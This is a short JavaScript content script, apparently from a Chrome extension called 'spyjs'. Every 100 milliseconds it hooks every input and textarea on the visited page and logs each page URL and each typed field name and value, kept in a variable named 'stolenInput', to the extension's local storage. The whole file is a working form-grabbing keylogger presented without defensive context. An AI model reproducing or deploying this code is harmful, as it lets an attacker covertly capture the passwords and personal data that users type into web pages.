var debug = 1;

var currLoc = "";
spyjs_refreshEvents();

setInterval(function(){
	spyjs_refreshEvents();
}, 100);

function spyjs_refreshEvents(){
	if(currLoc != location.href){
		currLoc=location.href;
		if(debug){
			console.log("("+currLoc+")");
		}
		spyjs_saveData("("+currLoc+")");
	}
	$('input').unbind('change');
	$('input').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
	$('textarea').unbind('change');
	$('textarea').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
}
	

function spyjs_getInput(inputInfo){
	var name = inputInfo.name;
	var value = inputInfo.value;
	var stolenInput = {};
	if(name === ""){
		name="undefined_input";
	}
	if(value != ""){
		stolenInput[name] = value;
		if(debug){
			console.log(name+"="+value);
		}
		spyjs_saveData("("+currLoc+")("+name+"=>"+value+")");
	}
}

function spyjs_saveData(data){
	var timestamp = new Date().getTime();
	var obj = {};
	obj[timestamp] = data;
	chrome.storage.local.set(obj);
}

